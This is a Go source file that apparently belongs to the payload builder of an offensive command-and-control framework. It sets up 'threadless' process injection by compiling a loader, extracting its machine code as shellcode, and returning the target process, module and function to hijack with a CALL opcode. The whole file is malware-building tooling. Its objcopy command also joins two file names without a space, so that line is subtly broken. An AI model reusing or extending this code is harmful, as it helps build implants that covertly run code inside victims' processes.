package core

import (
	"os"
	"strconv"
)

func (h *HexaneConfig) GetInjectConfig(injType string) ([]string, error) {
	var (
		err     error
		bLoader []byte
	)

	switch injType {
	case "threadless":
		{
			opcode := []byte{0xE8, 0x00, 0x00, 0x00, 0x00}
			execute := h.UserConfig.Loader.Injection.Config.(*Threadless).Execute
			loader := h.UserConfig.Loader.Injection.Config.(*Threadless).LoaderAsm

			if err = h.CompileObject(h.Compiler.Mingw+" -c ", execute+".o", []string{execute}, h.Compiler.Flags, []string{RootDirectory}, nil); err != nil {
				return nil, err
			}

			if err = h.CompileObject(h.Compiler.Mingw+" -c ", loader+".o", []string{loader}, nil, []string{RootDirectory}, nil); err != nil {
				return nil, err
			}

			if err = RunCommand(h.Compiler.Objcopy+" -j .text -O binary "+loader+".o"+"loader_shc.bin", strconv.Itoa(int(h.PeerId))); err != nil {
				return nil, err
			}

			if bLoader, err = os.ReadFile("loader_shc.bin"); err != nil {
				return nil, err
			}

			return []string{
				h.UserConfig.Loader.Injection.Config.(*Threadless).TargetProc,
				h.UserConfig.Loader.Injection.Config.(*Threadless).TargetModule,
				h.UserConfig.Loader.Injection.Config.(*Threadless).TargetFunc,
				string(opcode),
				string(bLoader),
			}, nil
		}
	}

	return []string{}, nil
}
